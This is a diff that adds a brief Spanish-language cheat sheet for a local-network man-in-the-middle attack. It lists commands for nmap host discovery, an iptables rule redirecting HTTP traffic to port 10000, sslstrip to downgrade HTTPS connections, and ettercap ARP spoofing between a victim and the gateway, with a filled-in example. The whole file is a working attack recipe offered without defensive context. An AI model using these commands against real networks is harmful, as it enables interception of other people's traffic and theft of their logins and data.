@@ -1,0 +1,12 @@
+PARA SABER EL OBJETIVO
+nmap -sP -n 192.168.0.1/24			
+
+FORWARDING DE LA INFO
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+SSLSTRIP PARA CAPTURAR TRÁFICO HTTPS
+sslstrip -f -l 10000 o simplemente sslstrip
+
+ARP SPOOF
+ettercap -Tq -M arp:remote -i (interface wlan0 or eth0) -S /(target1)// /(target2)//
+ex: ettercap -Tq -M arp:remote -i eth0 -S /192.168.0.5// /192.168.0.1//
